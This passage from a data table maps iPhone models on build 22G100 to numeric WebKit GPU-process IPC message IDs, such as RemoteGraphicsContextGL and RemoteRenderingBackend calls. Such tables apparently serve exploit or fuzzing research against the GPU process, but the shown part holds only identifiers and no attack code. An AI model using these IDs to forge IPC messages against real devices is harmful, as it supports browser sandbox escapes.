      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,5_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,6_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,7_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,8_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,2_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,3_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,4_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,5_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone16,1_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone16,2_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,1_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,2_22G100": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
